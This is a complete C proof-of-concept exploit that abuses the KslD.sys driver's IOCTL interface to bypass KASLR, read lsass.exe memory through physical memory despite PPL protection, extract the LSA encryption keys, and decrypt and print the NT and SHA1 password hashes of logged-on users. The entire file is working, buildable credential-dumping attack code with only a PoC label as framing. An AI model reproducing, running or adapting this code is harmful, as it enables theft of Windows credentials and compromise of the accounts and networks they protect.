/*
 * PoC: KslD.sys SubCmd 7 - Full credential extraction (C version)
 *
 * Chain: SubCmd 7 -> PsInitialSystemProcess -> EPROCESS walk -> lsass DTB ->
 *        physical memory (PPL bypass) -> LSA key extraction -> NT hash decryption
 *
 * KASLR bypass: SubCmd 7 (MmGetSystemRoutineAddress) - single IOCTL call
 * Crypto: Windows BCrypt API (AES-CFB128, 3DES-CBC)
 * Sig scan: Read lsasrv.dll from disk, resolve RVAs, read runtime values from lsass
 *
 * Build: cl /O2 /std:c17 poc_subcmd7_cred.c /Fe:poc_subcmd7_cred.exe
 *        /link shell32.lib bcrypt.lib advapi32.lib
 */
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

#define KSLD_IOCTL   0x222044
#define PFN_MASK     0xFFFFFFFFF000ULL
#define MAX_CREDS    32

/* ── Globals ──────────────────────────────────────────────────── */
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Helpers ──────────────────────────────────────────────────── */
static uint16_t rw(const uint8_t *d, size_t o) { uint16_t v; memcpy(&v, d+o, 2); return v; }
static uint32_t rd(const uint8_t *d, size_t o) { uint32_t v; memcpy(&v, d+o, 4); return v; }
static int32_t  ri(const uint8_t *d, size_t o) { int32_t  v; memcpy(&v, d+o, 4); return v; }
static uint64_t rp(const uint8_t *d, size_t o) { uint64_t v; memcpy(&v, d+o, 8); return v; }

static void hex_str(const uint8_t *data, size_t len, char *out) {
    for (size_t i = 0; i < len; i++) sprintf(out + i*2, "%02x", data[i]);
    out[len*2] = 0;
}

/* ── IOCTL layer ──────────────────────────────────────────────── */
static BOOL ioctl_raw(const void *in, DWORD in_sz, void *out, DWORD out_sz, DWORD *ret) {
    DWORD r = 0;
    BOOL ok = DeviceIoControl(g_dev, KSLD_IOCTL, (void*)in, in_sz, out, out_sz, &r, NULL);
    if (ret) *ret = r;
    return ok && r > 0;
}

/* ── SubCmd 7: MmGetSystemRoutineAddress (THE NOVEL PRIMITIVE) ── */
static uint64_t resolve_symbol(const wchar_t *name) {
    size_t nchars = wcslen(name) + 1;
    size_t nbytes = nchars * sizeof(wchar_t);
    size_t total = 12 + nbytes;
    uint8_t *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    if (!buf) return 0;
    *(uint32_t*)(buf+0) = 7;
    *(uint32_t*)(buf+4) = (uint32_t)nbytes;
    *(uint32_t*)(buf+8) = 0x0c;
    memcpy(buf+12, name, nbytes);
    uint64_t result = 0; DWORD ret = 0;
    if (ioctl_raw(buf, (DWORD)total, &result, sizeof(result), &ret) && ret >= 8) {
        HeapFree(GetProcessHeap(), 0, buf);
        return result;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return 0;
}

/* ── SubCmd 12: Memory read ───────────────────────────────────── */
#pragma pack(push,1)
typedef struct { uint32_t cmd; uint32_t res; uint64_t addr; uint64_t size; uint32_t mode; uint32_t pad; } IoRead;
#pragma pack(pop)

static BOOL virt_read(uint64_t addr, void *out, uint64_t sz) {
    IoRead req = {12, 0, addr, sz, 2, 0};
    DWORD osz = (DWORD)(sz+256>4096?sz+256:4096);
    uint8_t *tmp = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, osz);
    if (!tmp) return FALSE;
    DWORD ret = 0;
    BOOL ok = ioctl_raw(&req, sizeof(req), tmp, osz, &ret);
    if (ok && ret >= sz) { memcpy(out, tmp, (size_t)sz); HeapFree(GetProcessHeap(),0,tmp); return TRUE; }
    HeapFree(GetProcessHeap(),0,tmp);
    return FALSE;
}
static BOOL phys_read(uint64_t addr, void *out, uint64_t sz) {
    IoRead req = {12, 0, addr, sz, 1, 0};
    DWORD osz = (DWORD)(sz+256>4096?sz+256:4096);
    uint8_t *tmp = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, osz);
    if (!tmp) return FALSE;
    DWORD ret = 0;
    BOOL ok = ioctl_raw(&req, sizeof(req), tmp, osz, &ret);
    if (ok && ret >= sz) { memcpy(out, tmp, (size_t)sz); HeapFree(GetProcessHeap(),0,tmp); return TRUE; }
    HeapFree(GetProcessHeap(),0,tmp);
    return FALSE;
}

/* ── Page table walk ──────────────────────────────────────────── */
static uint64_t vtp(uint64_t dtb, uint64_t va) {
    uint64_t db = dtb & PFN_MASK, entry;
    int shifts[] = {39, 30, 21};
    for (int i = 0; i < 3; i++) {
        int s = shifts[i];
        if (!phys_read(db + ((va >> s)&0x1FF)*8, &entry, 8)) return 0;
        if (!(entry&1)) return 0;
        if ((entry&0x80) && s < 39) {
            uint64_t m = ((uint64_t)1<<s)-1;
            return (entry & PFN_MASK & ~m) | (va & m);
        }
        db = entry & PFN_MASK;
    }
    if (!phys_read(db + ((va>>12)&0x1FF)*8, &entry, 8)) return 0;
    if (entry&1) return (entry&PFN_MASK)|(va&0xFFF);
    if (entry&0x800) return (entry&PFN_MASK)|(va&0xFFF);
    return 0;
}

static BOOL proc_read(uint64_t dtb, uint64_t va, void *out, size_t sz) {
    uint8_t *dst = (uint8_t*)out;
    size_t off = 0;
    while (off < sz) {
        size_t pg = (va+off)&0xFFF, chunk = sz-off;
        if (chunk > 0x1000-pg) chunk = 0x1000-pg;
        uint64_t pa = vtp(dtb, va+off);
        if (pa) { if (!phys_read(pa, dst+off, chunk)) memset(dst+off,0,chunk); }
        else memset(dst+off,0,chunk);
        off += chunk;
    }
    return TRUE;
}

static uint64_t read_ptr(uint64_t dtb, uint64_t va) {
    uint64_t v=0; proc_read(dtb, va, &v, 8); return v;
}
static uint64_t resolve_rip(uint64_t dtb, uint64_t va) {
    int32_t d=0; proc_read(dtb, va, &d, 4); return va+4+d;
}

/* ── Crypto: AES-CFB128 decrypt ───────────────────────────────── */
static BOOL aes_cfb128_decrypt(const uint8_t *ct, size_t ct_len,
                                const uint8_t *key, size_t key_len,
                                const uint8_t *iv, uint8_t *pt) {
    BCRYPT_ALG_HANDLE alg = NULL; BCRYPT_KEY_HANDLE bk = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0))) return FALSE;
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
                      sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(alg, &bk, NULL, 0,
        (PUCHAR)key, (ULONG)key_len, 0))) { BCryptCloseAlgorithmProvider(alg,0); return FALSE; }
    uint8_t fb[16]; memcpy(fb, iv, 16);
    for (size_t off = 0; off < ct_len; off += 16) {
        uint8_t enc[16], fb2[16]; memcpy(fb2, fb, 16);
        ULONG rl = 0;
        BCryptEncrypt(bk, fb2, 16, NULL, NULL, 0, enc, 16, &rl, 0);
        size_t bl = ct_len-off < 16 ? ct_len-off : 16;
        for (size_t i = 0; i < bl; i++) pt[off+i] = enc[i] ^ ct[off+i];
        memset(fb, 0, 16); memcpy(fb, ct+off, bl);
    }
    BCryptDestroyKey(bk); BCryptCloseAlgorithmProvider(alg, 0);
    return TRUE;
}

/* ── Crypto: 3DES-CBC decrypt ─────────────────────────────────── */
static BOOL des3_cbc_decrypt(const uint8_t *ct, size_t ct_len,
                              const uint8_t *key, size_t key_len,
                              const uint8_t *iv8, uint8_t *pt) {
    BCRYPT_ALG_HANDLE alg = NULL; BCRYPT_KEY_HANDLE bk = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_3DES_ALGORITHM, NULL, 0))) return FALSE;
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(alg, &bk, NULL, 0,
        (PUCHAR)key, (ULONG)key_len, 0))) { BCryptCloseAlgorithmProvider(alg,0); return FALSE; }
    uint8_t iv_copy[8]; memcpy(iv_copy, iv8, 8);
    ULONG rl = 0;
    BOOL ok = BCRYPT_SUCCESS(BCryptDecrypt(bk, (PUCHAR)ct, (ULONG)ct_len, NULL,
                iv_copy, 8, pt, (ULONG)ct_len, &rl, 0));
    BCryptDestroyKey(bk); BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

/* ── LSA decrypt dispatcher ───────────────────────────────────── */
static BOOL lsa_decrypt(const uint8_t *enc, size_t enc_len,
                         const uint8_t *aes_key, size_t aes_len,
                         const uint8_t *des_key, size_t des_len,
                         const uint8_t *iv, uint8_t *pt) {
    if (enc_len % 8 != 0)
        return aes_cfb128_decrypt(enc, enc_len, aes_key, aes_len, iv, pt);
    else
        return des3_cbc_decrypt(enc, enc_len, des_key, des_len, iv, pt);
}

/* ── Signature tables ─────────────────────────────────────────── */
typedef struct { const uint8_t *pat; size_t pat_len; int32_t iv_off, des_off, aes_off; uint32_t hk_off; } LsaSig;
typedef struct { const uint8_t *pat; size_t pat_len; int32_t fe_off, cnt_off, corr_off; uint32_t min_build; } MsvSig;

static const uint8_t lsa_a[]={0x83,0x64,0x24,0x30,0x00,0x48,0x8d,0x45,0xe0,0x44,0x8b,0x4d,0xd8,0x48,0x8d,0x15};
static const uint8_t lsa_b[]={0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4d,0xd8,0x48,0x8b,0x0d};
static const uint8_t lsa_c[]={0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4c,0x24,0x48,0x48,0x8b,0x0d};

static const LsaSig LSA_SIGS[] = {
    {lsa_a,16, 71,-89,16, 0x38}, {lsa_a,16, 58,-89,16, 0x38},
    {lsa_a,16, 67,-89,16, 0x38}, {lsa_a,16, 61,-73,16, 0x38},
    {lsa_b,12, 62,-70,23, 0x38}, {lsa_b,12, 62,-70,23, 0x28},
    {lsa_b,12, 58,-62,23, 0x28},
    {lsa_c,13, 59,-61,25, 0x18}, {lsa_c,13, 63,-69,25, 0x18},
};

static const uint8_t m0[]={0x45,0x89,0x34,0x24,0x48,0x8b,0xfb,0x45,0x85,0xc0,0x0f};
static const uint8_t m1[]={0x45,0x89,0x34,0x24,0x8b,0xfb,0x45,0x85,0xc0,0x0f};
static const uint8_t m2[]={0x45,0x89,0x37,0x49,0x4c,0x8b,0xf7,0x8b,0xf3,0x45,0x85,0xc0,0x0f};
static const uint8_t m3[]={0x45,0x89,0x34,0x24,0x4c,0x8b,0xff,0x8b,0xf3,0x45,0x85,0xc0,0x74};
static const uint8_t m4[]={0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74};
static const uint8_t m5[]={0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc9,0x74};
static const uint8_t m6[]={0x33,0xff,0x45,0x89,0x37,0x48,0x8b,0xf3,0x45,0x85,0xc9,0x74};
static const uint8_t m7[]={0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74};

static const MsvSig MSV_SIGS[] = {
    {m0,11, 25,-16,34, 26200}, {m1,10, 25,-16,34, 26200},
    {m2,13, 27, -4, 0, 22631}, {m3,13, 24, -4, 0, 20348},
    {m4,12, 23, -4, 0, 18362}, {m5,12, 23, -4, 0, 17134},
    {m6,12, 23, -4, 0, 15063}, {m7,12, 16, -4, 0, 10240},
};

/* ── Session offsets by build ─────────────────────────────────── */
typedef struct { uint32_t luid, user, domain, ltype, cred; } SessOff;
static SessOff sess_off(uint32_t b) {
    if (b>=22000) return (SessOff){0x70,0xA0,0xB0,0xE8,0x118};
    if (b>=9600)  return (SessOff){0x70,0x90,0xA0,0xD0,0x108};
    if (b>=7601)  return (SessOff){0x58,0x78,0x88,0xBC,0xF0};
    return (SessOff){0x48,0x68,0x78,0xAC,0xE0};
}

/* ── Credential storage ───────────────────────────────────────── */
typedef struct {
    wchar_t user[128]; wchar_t domain[128];
    char nt_hash[33]; char sha_hash[41];
} Cred;
static Cred g_creds[MAX_CREDS];
static int g_ncreds = 0;

/* ── Read UNICODE_STRING from struct ──────────────────────────── */
static void read_ustr(uint64_t dtb, const uint8_t *data, size_t off, wchar_t *out, size_t out_max) {
    out[0] = 0;
    uint16_t len = rw(data, off);
    uint64_t buf = rp(data, off+8);
    if (!len || !buf || len > 512) return;
    uint8_t raw[512]; memset(raw,0,sizeof(raw));
    proc_read(dtb, buf, raw, len < 512 ? len : 512);
    size_t wlen = len/2;
    if (wlen >= out_max) wlen = out_max-1;
    memcpy(out, raw, wlen*2);
    out[wlen] = 0;
}

static void read_astr(uint64_t dtb, const uint8_t *data, size_t off, char *out, size_t out_max) {
    out[0] = 0;
    uint16_t len = rw(data, off);
    uint64_t buf = rp(data, off+8);
    if (!len || !buf || len >= out_max) return;
    proc_read(dtb, buf, out, len);
    out[len] = 0;
}

/* ── Local pattern search in file bytes ───────────────────────── */
static uint32_t local_search(const uint8_t *mem, uint32_t sz, const uint8_t *pat, uint32_t plen) {
    for (uint32_t i = 0; i+plen <= sz; i++)
        if (memcmp(mem+i, pat, plen) == 0) return i;
    return (uint32_t)-1;
}

/* ── RIP-relative resolve on raw file bytes ───────────────────── */
static uint32_t resolve_rip_raw(const uint8_t *text_raw, uint32_t text_va, uint32_t off) {
    int32_t disp; memcpy(&disp, text_raw+off, 4);
    return (uint32_t)((int32_t)(text_va + off + 4) + disp);
}

/* ── Extract BCrypt key from lsass memory ─────────────────────── */
static BOOL extract_bcrypt_key(uint64_t dtb, uint64_t ptr_va, uint32_t hk_off,
                                uint8_t *key_out, uint32_t *key_len) {
    uint64_t handle_va = read_ptr(dtb, ptr_va);
    if (!handle_va) return FALSE;
    uint8_t hk[0x20]; proc_read(dtb, handle_va, hk, 0x20);
    if (memcmp(hk+4, "RUUU", 4) != 0) return FALSE;
    uint64_t key_va = rp(hk, 0x10);
    if (!key_va) return FALSE;
    uint8_t kd[0x80]; memset(kd,0,sizeof(kd));
    proc_read(dtb, key_va, kd, hk_off+0x30 < 0x80 ? hk_off+0x30 : 0x80);
    uint32_t cb = rd(kd, hk_off);
    if (cb == 0 || cb > 64) return FALSE;
    memcpy(key_out, kd+hk_off+4, cb);
    *key_len = cb;
    return TRUE;
}

/* ── Read lsasrv.dll from disk ────────────────────────────────── */
static uint8_t* read_file(const wchar_t *path, size_t *out_sz) {
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    DWORD hi = 0; DWORD lo = GetFileSize(hf, &hi);
    size_t sz = lo;
    uint8_t *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD got = 0;
    ReadFile(hf, buf, (DWORD)sz, &got, NULL);
    CloseHandle(hf);
    *out_sz = got;
    return buf;
}

/* ── Find .text section in PE ─────────────────────────────────── */
typedef struct { uint32_t va, vsz, raw_off, raw_sz; } TextSec;
static TextSec find_text(const uint8_t *pe, size_t pe_sz) {
    TextSec t = {0};
    if (pe_sz < 0x200) return t;
    uint32_t pe_off = rd(pe, 0x3C);
    uint16_t nsec = rw(pe, pe_off+6);
    uint16_t opt = rw(pe, pe_off+0x14);
    uint32_t sec = pe_off + 0x18 + opt;
    for (int i = 0; i < nsec; i++) {
        uint32_t s = sec + i*40;
        if (s+40 > pe_sz) break;
        if (memcmp(pe+s, ".text", 5) == 0) {
            t.va = rd(pe, s+12); t.vsz = rd(pe, s+8);
            t.raw_off = rd(pe, s+20); t.raw_sz = rd(pe, s+16);
            return t;
        }
    }
    return t;
}

/* ═══════════════════════════════════════════════════════════════ */
/*                           MAIN                                 */
/* ═══════════════════════════════════════════════════════════════ */

int main(void) {
    if (!IsUserAnAdmin()) { printf("[-] Requires administrator\n"); return 1; }

    /* Build number */
    HKEY hk; uint32_t build = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t bstr[32]; DWORD bsz = sizeof(bstr);
        RegQueryValueExW(hk, L"CurrentBuildNumber", NULL, NULL, (LPBYTE)bstr, &bsz);
        RegCloseKey(hk);
        build = (uint32_t)wcstoul(bstr, NULL, 10);
    }

    printf("================================================================\n");
    printf("  SubCmd 7 Full Credential Extraction PoC (C)\n");
    printf("  Windows Build %u\n", build);
    printf("================================================================\n\n");

    /* Open device */
    g_dev = CreateFileW(L"\\\\.\\KslD", GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile failed: %lu\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n");

    /* ── Step 1: KASLR bypass via SubCmd 7 ──────────────────────── */
    printf("\n[*] Step 1: KASLR bypass via SubCmd 7\n");
    uint64_t psip_addr = resolve_symbol(L"PsInitialSystemProcess");
    if (!psip_addr) { printf("[-] SubCmd 7 failed\n"); return 1; }
    printf("    PsInitialSystemProcess = 0x%016llx\n", (unsigned long long)psip_addr);

    /* ── Step 2: EPROCESS walk -> lsass ─────────────────────────── */
    printf("\n[*] Step 2: Finding lsass.exe\n");
    uint64_t sys_ep = 0;
    virt_read(psip_addr, &sys_ep, 8);
    if (!sys_ep) { printf("[-] Cannot read PsInitialSystemProcess\n"); return 1; }

    uint8_t ep_data[0x800];
    virt_read(sys_ep, ep_data, sizeof(ep_data));

    uint32_t off_pid=0, off_links=0, off_name=0;
    for (uint32_t o = 0x100; o < 0x600; o += 8) {
        if (rp(ep_data,o)==4 && rp(ep_data,o+8)>0xFFFF000000000000ULL) {
            off_pid=o; off_links=o+8; break;
        }
    }
    for (uint32_t o = 0x200; o < 0x700; o++) {
        if (memcmp(ep_data+o, "System\0", 7)==0) { off_name=o; break; }
    }
    if (!off_pid || !off_name) { printf("[-] EPROCESS offsets not found\n"); return 1; }

    uint64_t head = sys_ep + off_links, cur = 0;
    virt_read(head, &cur, 8);
    uint64_t lsass_ep=0, lsass_dtb=0; uint32_t lsass_pid=0, lsass_peb_off=0;

    uint64_t seen[1024]; int nseen=1; seen[0]=head;
    for (int iter=0; iter<500 && cur; iter++) {
        int dup=0; for(int s=0;s<nseen;s++) if(seen[s]==cur){dup=1;break;}
        if (dup) break;
        if (nseen<1024) seen[nseen++]=cur;
        uint64_t ep = cur - off_links;
        char nm[16]={0}; virt_read(ep+off_name, nm, 15);
        if (_stricmp(nm, "lsass.exe")==0) {
            uint64_t pid=0; virt_read(ep+off_pid, &pid, 8);
            virt_read(ep+0x28, &lsass_dtb, 8);
            lsass_ep = ep; lsass_pid = (uint32_t)pid;
            printf("    lsass.exe PID=%u DTB=0x%llx\n", lsass_pid, (unsigned long long)lsass_dtb);

            /* Find PEB offset */
            uint8_t ep2[0x600]; virt_read(ep, ep2, sizeof(ep2));
            for (uint32_t po=0x100; po<0x600; po+=8) {
                uint64_t v = rp(ep2, po);
                if (v>0x10000 && v<0x7FFFFFFFFFFFULL) {
                    uint8_t peb[0x20]={0}; proc_read(lsass_dtb, v, peb, 0x20);
                    uint64_t ldr=rp(peb,0x18), img=rp(peb,0x10);
                    if (ldr>0x10000&&ldr<0x7FFFFFFFFFFFULL && img>0x10000&&img<0x7FFFFFFFFFFFULL) {
                        lsass_peb_off = po; break;
                    }
                }
            }
            break;
        }
        virt_read(cur, &cur, 8);
    }
    if (!lsass_ep) { printf("[-] lsass.exe not found\n"); return 1; }

    /* ── Step 3: Find lsasrv.dll ────────────────────────────────── */
    printf("\n[*] Step 3: Finding lsasrv.dll\n");
    uint64_t peb_va = read_ptr(lsass_dtb, lsass_ep + lsass_peb_off);
    uint8_t peb[0x20]; proc_read(lsass_dtb, peb_va, peb, 0x20);
    uint64_t ldr_va = rp(peb, 0x18);
    uint64_t ldr_head = ldr_va + 0x20;
    uint64_t ldr_cur = read_ptr(lsass_dtb, ldr_head);

    uint64_t lsasrv_base=0; uint32_t lsasrv_size=0;
    uint64_t ldr_seen[256]; int ldr_nseen=1; ldr_seen[0]=ldr_head;
    for (int i=0; i<200 && ldr_cur; i++) {
        int dup=0; for(int s=0;s<ldr_nseen;s++) if(ldr_seen[s]==ldr_cur){dup=1;break;}
        if (dup) break;
        if (ldr_nseen<256) ldr_seen[ldr_nseen++]=ldr_cur;
        uint8_t entry[0x80]={0}; proc_read(lsass_dtb, ldr_cur-0x10, entry, 0x80);
        uint64_t dbase = rp(entry,0x30); uint32_t dsz = rd(entry,0x40);
        uint16_t nlen = rw(entry,0x48); uint64_t nptr = rp(entry,0x50);
        if (nlen && nptr && nlen<512) {
            wchar_t wn[256]={0}; proc_read(lsass_dtb, nptr, wn, nlen<510?nlen:510);
            _wcslwr(wn);
            if (wcsstr(wn, L"lsasrv.dll")) {
                lsasrv_base = dbase; lsasrv_size = dsz;
                printf("    lsasrv.dll base=0x%llx size=0x%x\n",
                       (unsigned long long)lsasrv_base, lsasrv_size);
                break;
            }
        }
        ldr_cur = rp(entry, 0x10);
    }
    if (!lsasrv_base) { printf("[-] lsasrv.dll not found\n"); return 1; }

    /* ── Step 4: Read lsasrv.dll from disk, find signatures ─────── */
    printf("\n[*] Step 4: Extracting LSA keys (disk sig scan)\n");
    wchar_t dll_path[MAX_PATH];
    GetSystemDirectoryW(dll_path, MAX_PATH);
    wcscat(dll_path, L"\\lsasrv.dll");
    size_t dll_sz = 0;
    uint8_t *dll = read_file(dll_path, &dll_sz);
    if (!dll || dll_sz < 0x1000) { printf("[-] Cannot read lsasrv.dll from disk\n"); return 1; }

    TextSec ts = find_text(dll, dll_sz);
    if (!ts.raw_sz) { printf("[-] .text not found\n"); return 1; }
    const uint8_t *text_raw = dll + ts.raw_off;

    uint8_t iv[16]={0}, aes_key[64]={0}, des_key[64]={0};
    uint32_t aes_len=0, des_len=0;
    BOOL keys_found = FALSE;

    for (int si=0; si < sizeof(LSA_SIGS)/sizeof(LSA_SIGS[0]) && !keys_found; si++) {
        const LsaSig *s = &LSA_SIGS[si];
        uint32_t soff = local_search(text_raw, ts.raw_sz, s->pat, (uint32_t)s->pat_len);
        if (soff == (uint32_t)-1) continue;

        uint32_t iv_rva  = resolve_rip_raw(text_raw, ts.va, soff + s->iv_off);
        uint32_t des_rva = resolve_rip_raw(text_raw, ts.va, soff + s->des_off);
        uint32_t aes_rva = resolve_rip_raw(text_raw, ts.va, soff + s->aes_off);

        uint8_t test_iv[16]={0};
        proc_read(lsass_dtb, lsasrv_base + iv_rva, test_iv, 16);
        int all_zero = 1;
        for (int i=0;i<16;i++) if(test_iv[i]){all_zero=0;break;}
        if (all_zero) continue;

        uint8_t tk[64]; uint32_t tl=0;
        if (!extract_bcrypt_key(lsass_dtb, lsasrv_base + des_rva, s->hk_off, des_key, &des_len)) continue;
        if (!extract_bcrypt_key(lsass_dtb, lsasrv_base + aes_rva, s->hk_off, aes_key, &aes_len)) continue;
        memcpy(iv, test_iv, 16);
        keys_found = TRUE;
    }

    if (!keys_found) { printf("[-] LSA keys not found\n"); HeapFree(GetProcessHeap(),0,dll); return 1; }

    char iv_hex[33], aes_hex[129], des_hex[129];
    hex_str(iv, 16, iv_hex);
    hex_str(aes_key, aes_len, aes_hex);
    hex_str(des_key, des_len, des_hex);
    printf("    IV  = %s\n    AES = %s\n    3DES= %s\n", iv_hex, aes_hex, des_hex);

    /* ── Step 5: Find LogonSessionList ──────────────────────────── */
    printf("\n[*] Step 5: Finding LogonSessionList\n");
    uint64_t list_ptr = 0; uint32_t list_count = 1;
    BOOL list_found = FALSE;

    for (int si=0; si < sizeof(MSV_SIGS)/sizeof(MSV_SIGS[0]) && !list_found; si++) {
        const MsvSig *s = &MSV_SIGS[si];
        if (build < s->min_build) continue;
        uint32_t soff = local_search(text_raw, ts.raw_sz, s->pat, (uint32_t)s->pat_len);
        if (soff == (uint32_t)-1) continue;

        uint32_t fe_rva = resolve_rip_raw(text_raw, ts.va, soff + s->fe_off);
        uint64_t lp = lsasrv_base + fe_rva;
        if (s->corr_off) {
            uint32_t extra = rd(text_raw, soff + s->corr_off);
            lp += extra;
        }
        uint64_t head_val = read_ptr(lsass_dtb, lp);
        if (head_val && head_val != lp) {
            list_ptr = lp;
            if (build >= 9200 && s->cnt_off) {
                uint32_t cnt_rva = resolve_rip_raw(text_raw, ts.va, soff + s->cnt_off);
                uint8_t cnt = 0;
                proc_read(lsass_dtb, lsasrv_base + cnt_rva, &cnt, 1);
                if (cnt) list_count = cnt;
            }
            list_found = TRUE;
        }
    }
    HeapFree(GetProcessHeap(), 0, dll);

    if (!list_found) { printf("[-] LogonSessionList not found\n"); return 1; }
    printf("    LogonSessionList @ 0x%llx, count=%u\n", (unsigned long long)list_ptr, list_count);

    /* ── Step 6: Extract credentials ────────────────────────────── */
    printf("\n[*] Step 6: Extracting credentials\n");
    SessOff so = sess_off(build);

    for (uint32_t idx = 0; idx < list_count && g_ncreds < MAX_CREDS; idx++) {
        uint64_t head_va = list_ptr + idx * 16;
        uint64_t entry = read_ptr(lsass_dtb, head_va);
        uint64_t e_seen[256]; int e_nseen=1; e_seen[0]=head_va;

        while (entry && g_ncreds < MAX_CREDS) {
            int dup=0; for(int s=0;s<e_nseen;s++) if(e_seen[s]==entry){dup=1;break;}
            if (dup || e_nseen>=256) break;
            e_seen[e_nseen++] = entry;

            uint8_t data[0x200]={0}; proc_read(lsass_dtb, entry, data, sizeof(data));
            int all0=1; for(int i=0;i<0x200;i++) if(data[i]){all0=0;break;}
            if (all0) break;

            wchar_t user[128]={0}, domain[128]={0};
            read_ustr(lsass_dtb, data, so.user, user, 128);
            read_ustr(lsass_dtb, data, so.domain, domain, 128);
            uint64_t cred_ptr = rp(data, so.cred);

            if (user[0] && cred_ptr) {
                /* Walk credential chain */
                uint64_t cc = cred_ptr;
                uint64_t cc_seen[64]; int cc_nseen=0;
                while (cc && cc_nseen < 20) {
                    int d2=0; for(int s=0;s<cc_nseen;s++) if(cc_seen[s]==cc){d2=1;break;}
                    if(d2)break; cc_seen[cc_nseen++]=cc;
                    uint8_t cd[0x20]; proc_read(lsass_dtb, cc, cd, 0x20);
                    uint64_t nxt=rp(cd,0), pc=rp(cd,0x10);
                    if (pc) {
                        /* Walk primary credentials */
                        uint64_t pp = pc;
                        uint64_t pp_seen[64]; int pp_nseen=0;
                        while (pp && pp_nseen < 20 && g_ncreds < MAX_CREDS) {
                            int d3=0; for(int s=0;s<pp_nseen;s++) if(pp_seen[s]==pp){d3=1;break;}
                            if(d3)break; pp_seen[pp_nseen++]=pp;
                            uint8_t pd[0x60]={0}; proc_read(lsass_dtb, pp, pd, 0x60);
                            int a0=1; for(int i=0;i<0x60;i++) if(pd[i]){a0=0;break;}
                            if(a0)break;
                            uint64_t pnxt=rp(pd,0);
                            char pkg[32]={0}; read_astr(lsass_dtb, pd, 8, pkg, 32);
                            uint16_t enc_len=rw(pd,0x18); uint64_t enc_buf=rp(pd,0x20);

                            if (strcmp(pkg,"Primary")==0 && enc_len>0 && enc_len<0x10000 && enc_buf) {
                                uint8_t *blob = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, enc_len);
                                proc_read(lsass_dtb, enc_buf, blob, enc_len);
                                int bz=1; for(int i=0;i<enc_len;i++) if(blob[i]){bz=0;break;}
                                if (!bz) {
                                    uint8_t *dec = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, enc_len+16);
                                    if (lsa_decrypt(blob, enc_len, aes_key, aes_len, des_key, des_len, iv, dec)) {
                                        if (enc_len >= 70 && !dec[40] && dec[41]) {
                                            Cred *c = &g_creds[g_ncreds];
                                            wcscpy(c->user, user);
                                            wcscpy(c->domain, domain);
                                            hex_str(dec+0x46, 16, c->nt_hash);
                                            hex_str(dec+0x66, 20, c->sha_hash);
                                            /* Dedup check */
                                            int exists=0;
                                            for(int i=0;i<g_ncreds;i++)
                                                if(wcscmp(g_creds[i].user,user)==0 &&
                                                   wcscmp(g_creds[i].domain,domain)==0 &&
                                                   strcmp(g_creds[i].nt_hash,c->nt_hash)==0) {exists=1;break;}
                                            if (!exists) g_ncreds++;
                                        }
                                    }
                                    HeapFree(GetProcessHeap(),0,dec);
                                }
                                HeapFree(GetProcessHeap(),0,blob);
                            }
                            if (!pnxt||pnxt==pc) break;
                            pp = pnxt;
                        }
                    }
                    if (!nxt||nxt==cred_ptr) break;
                    cc = nxt;
                }
            }
            entry = rp(data, 0); /* flink */
        }
    }

    /* ── Output ─────────────────────────────────────────────────── */
    printf("\n================================================================\n");
    if (g_ncreds > 0) {
        printf("[+] %d credential(s) extracted via SubCmd 7 chain:\n\n", g_ncreds);
        for (int i = 0; i < g_ncreds; i++) {
            printf("  %ls\\%ls\n", g_creds[i].domain, g_creds[i].user);
            printf("    NT Hash: %s\n", g_creds[i].nt_hash);
            if (strcmp(g_creds[i].sha_hash, "0000000000000000000000000000000000000000") != 0)
                printf("    SHA1:    %s\n", g_creds[i].sha_hash);
            printf("\n");
        }
    } else {
        printf("[-] No credentials extracted (Credential Guard may be active)\n");
    }
    printf("================================================================\n");

    CloseHandle(g_dev);
    return 0;
}
